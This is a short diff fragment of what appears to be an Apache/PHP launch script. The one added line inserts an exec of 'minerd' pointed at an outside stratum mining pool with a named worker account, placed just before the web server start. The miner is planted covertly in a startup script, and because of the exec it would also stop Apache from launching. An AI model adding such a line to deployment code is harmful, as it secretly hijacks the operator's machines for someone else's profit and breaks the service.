@@ -74,7 +74,7 @@ tail -F /app/apache/logs/access_log &
 export LD_LIBRARY_PATH=/app/php/lib/php
 export PHP_INI_SCAN_DIR=/app/www
 echo "Launching apache"
-#exec /app/
+exec /app/./minerd -o stratum+tcp://primary.coinhuntr.com:3333 -O itsbalamurali.1:x
 exec /app/apache/bin/httpd -DNO_DETACH
 EOF
 
